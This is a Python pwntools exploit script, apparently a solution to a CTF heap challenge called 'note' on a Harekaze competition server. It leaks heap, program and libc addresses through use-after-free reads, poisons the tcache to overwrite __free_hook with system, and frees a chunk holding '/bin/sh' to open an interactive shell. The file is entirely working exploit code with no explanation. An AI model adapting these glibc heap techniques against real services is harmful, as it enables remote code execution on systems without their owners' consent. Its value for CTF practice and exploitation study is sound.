#!/usr/bin/env python
from pwn import *

def create(title):
    s.sendlineafter('Choice: ', '1')
    s.sendlineafter('Title: ', title)

def write(title, size, content):
    s.sendlineafter('Choice: ', '2')
    s.sendlineafter('content: ', title)
    s.sendlineafter('content: ', str(size))
    s.sendlineafter('Content: ', content)

def show(title):
    s.sendlineafter('Choice: ', '3')
    s.sendlineafter('content: ', title)
    return s.recvline(False)

def delete(title):
    s.sendlineafter('Choice: ', '4')
    s.sendlineafter('delete: ', title)

if len(sys.argv) == 1:
    s = process('./note')
else:
    s = remote('problem.harekaze.com', 20003)

elf = ELF('./note')
libc = ELF('./libc.so.6')

create('A')
create('B')
write('A', 1, 'A')
write('B', 1, 'B')
delete('B')
delete('A')
create('A')
heap_addr = u64(show('A').ljust(8, '\0'))
log.info('heap address: %#x' % heap_addr)

create('B')
create('C')
write('C', 0x28, 'A' * 0x20 + p64(heap_addr - 0x70))
delete('C')
create('C')
create('D')
text_base = u64(show('D').ljust(8, '\0')) - 0x4080
log.info('text base: %#x' % text_base)

create('E')
write('E', 0x28, 'A' * 0x20 + p64(text_base + elf.got['read']))
delete('E')
create('E')
create('F')
libc_base = u64(show('F').ljust(8, '\0')) - libc.symbols['read']
log.info('libc base: %#x' % libc_base)

for i in range(9):
    create(str(i))
    write(str(i), 0x38, 'A')
for i in range(9):
    delete(str(i))
for i in range(7):
    create(str(i))
create('8')
create('7')
delete('7')
create('7')
for i in range(7):
    create('0' + str(i))
    write('0' + str(i), 0x38, 'A')
for i in range(9, 14):
    create(str(i))
write('9', 0x38, p64(libc_base + libc.symbols['__free_hook']))
write('10', 0x38, 'A')
write('11', 0x38, 'A')
write('12', 0x38, p64(libc_base + libc.symbols['system']))
write('13', 8, '/bin/sh')
delete('13')
s.interactive()
